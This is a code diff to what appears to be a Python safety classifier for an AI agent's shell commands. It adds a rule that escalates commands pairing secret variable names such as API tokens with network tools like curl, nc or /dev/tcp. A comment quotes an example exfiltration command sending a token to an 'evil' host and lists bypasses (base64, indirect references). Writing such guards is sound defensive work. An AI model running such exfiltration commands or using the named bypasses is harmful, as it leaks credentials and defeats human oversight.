@@ -123,6 +123,22 @@ _ESCALATE_BASH: list[tuple[re.Pattern, str, bool]] = [
      "curl|sh(下载执行,供应链风险)", True),
 ]
 
+# 密钥外带的定向拦截:命令里【同时】出现敏感变量名 + 外带渠道 → 疑似把 key 送出去。
+# 第三方 provider key(ANTHROPIC_AUTH_TOKEN)是唯一无法从 env 移除的敏感值(CLI 必须用它),
+# 这条专挡「curl evil?k=$ANTHROPIC_AUTH_TOKEN」这类最直白的外带。其余变量名即使已被
+# config._scrub_env_secrets 清空,列进来也无害(scrub 若被 HERMES_KEEP_ENV_SECRETS 关掉时兜底)。
+# 这不是边界:base64/写文件再传/间接引用都能绕;只抬高门槛。日常命令几乎不会命中,误伤极低。
+_SECRET_VAR_RE = re.compile(
+    r"ANTHROPIC_AUTH_TOKEN|ANTHROPIC_API_KEY|CLAUDE_CODE_OAUTH_TOKEN|"
+    r"TELEGRAM_BOT_TOKEN|SILICONFLOW_API_KEY|VAPID_PRIVATE_KEY|WEB_AUTH_TOKEN"
+)
+_OUTBOUND_RE = re.compile(r"\b(curl|wget|nc|ncat|telnet|ssh|scp)\b|/dev/tcp/")
+
+
+def _looks_like_secret_exfil(cmd: str) -> bool:
+    return bool(_SECRET_VAR_RE.search(cmd) and _OUTBOUND_RE.search(cmd))
+
+
 # 会改写文件系统的工具 → 检查目标是否落在工作目录外
 _WRITE_TOOLS = {"Write", "Edit", "MultiEdit", "NotebookEdit"}
 
@@ -176,6 +192,9 @@ def classify(
         why = is_dangerous(cmd)
         if why:
             return ("block", why, False)
+        if _looks_like_secret_exfil(cmd):
+            # 疑似把密钥外带:自动化通道直接拒(restrict=True),有交互通道则请你确认
+            return ("escalate", "疑似把密钥/令牌通过网络外带", True)
         for rx, reason, restrict in _ESCALATE_BASH:
             if rx.search(cmd):
                 return ("escalate", reason, restrict)
